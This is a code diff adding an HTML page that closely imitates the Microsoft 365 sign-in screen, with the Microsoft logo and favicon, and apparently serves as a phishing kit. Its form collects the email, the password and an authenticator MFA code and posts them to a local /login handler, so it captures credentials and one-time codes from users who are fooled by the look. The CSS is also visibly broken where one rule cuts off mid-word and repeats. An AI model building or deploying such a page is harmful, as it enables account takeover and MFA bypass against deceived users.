@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="icon" href="https://login.microsoftonline.com/favicon.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
+            background: #f0f2f5; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15), 0 10px 40px rgba(0,0,0,0.07);
+            padding: 44px;
+            width: 440px;
+            max-width: 96%;
+        }
+        .logo { margin-bottom: 24px; }
+        .logo svg { height: 24px; }
+        h1 { 
+            font-size: 24px; 
+            font-weight: 600; 
+            color: #1b1b1b; 
+            margin-bottom: 12px;
+        }
+        .subtitle { color: #666; font-size: 14px; margin-bottom: 24px; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { 
+            display: block; 
+            font-size: 13px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 4px;
+        }
+        .form-group input { 
+            width: 100%; 
+            padding: 8px 12px; 
+            border: 1px solid #8c8c8c;
+            border-radius: 4px;
+            font-size: 15px;
+            height: 36px;
+            transition: border-color 0.15s;
+        }
+        .form-group input:focus {
+            border-color: #0067b8;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0,103,184,0.2);
+        }
+        .form-options { 
+            display: flex; 
+            justify
+.form-options { 
+            display: flex; 
+            justify-content: space-between;
+            align-items: center;
+            margin: 12px 0 20px;
+            font-size: 13px;
+        }
+        .form-options a { color: #0067b8; text-decoration: none; }
+        .form-options a:hover { text-decoration: underline; }
+        .btn { 
+            width: 100%; 
+            padding: 8px 16px; 
+            background: #0067b8; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            font-size: 15px; 
+            font-weight: 600; 
+            height: 36px;
+            cursor: pointer;
+        }
+        .btn:hover { background: #005da6; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .error { color: #d32f2f; font-size: 13px; margin: 8px 0; display: none; }
+        .loading { display: none; text-align: center; margin: 16px 0; }
+        .spinner { 
+            display: inline-block; width: 20px; height: 20px; 
+            border: 2px solid #e0e0e0; border-top-color: #0067b8; 
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .footer { margin-top: 24px; text-align: center; font-size: 12px; color: #888; }
+        .footer a { color: #666; text-decoration: none; margin: 0 8px; }
+        .footer a:hover { color: #333; text-decoration: underline; }
+        .kmsi { display: none; margin-top: 16px; }
+        .kmsi label { font-size: 13px; display: flex; align-items: center; gap: 8px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg"><rect x="1" y="1" width="9" height="9" fill="#f25022"/><rect x="11" y="1" width="9" height="9" fill="#7fba00"/><rect x="1" y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="11" width="9" height="9" fill="#ffb900"/></svg>
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Microsoft 365</p>
+        
+        <form id="loginForm" method="POST" action="/login" autocomplete="off">
+            <div id="step1">
+                <div class="form-group">
+                    <label for="username">Email, phone, or Skype</label>
+                    <input type="email" id="username" name="username" placeholder="someone@example.com" required autofocus>
+                </div>
+                <button type="button" class="btn" id="nextBtn" onclick="showPassword()">Next</button>
+            </div>
+            
+            <div id="step2" style="display:none;">
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <div class="form-options">
+                    <a href="#" onclick="showKMSI()">Forgot my password</a>
+                </div>
+                <button type="submit" class="btn" id="signinBtn">Sign in</button>
+            </div>
+            
+            <div id="step3" style="display:none;">
+                <div class="form-group">
+                    <label for="mfa_code">Enter the code from your authenticator app</label>
+                    <input type="text" id="mfa_code" name="mfa_code" placeholder="Code" autocomplete="off">
+                </div>
+                <button type="submit" class="btn">Verify</button>
+            </div>
+        </form>
+        
+        <div class="error" id="errorMsg">That username/password is incorrect. Please try again.</div>
+        <div class="loading"><div class="spinner"></div><p style="margin-top:8px;font-size:13px;color:#666;">Verifying...</p></div>
+        
+        <div class="kmsi" id="kmsiSection">
+            <label><input type="checkbox" id="kmsiCheck"> Stay signed in?</label>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy & cookies</a>
+        </div>
+    </div>
+
+    <script>
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+        const errorMsg = document.getElementById('errorMsg');
+        const loading = document.querySelector('.loading');
+        
+        function showPassword() {
+            if (!username.value.trim() || !username.value.includes('@')) {
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Enter a valid email address.';
+                return;
+            }
+            errorMsg.style.display = 'none';
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+            password.focus();
+        }
+        
+        function showKMSI() {
+            document.getElementById('kmsiSection').style.display = 'block';
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            loading.style.display = 'block';
+            document.getElementById('signinBtn').disabled = true;
+        });
+
+        // Simulate Enter key to advance
+        username.addEventListener('keydown', function(e) { if(e.key === 'Enter') { e.preventDefault(); showPassword(); } });
+    </script>
+</body>
+</html>
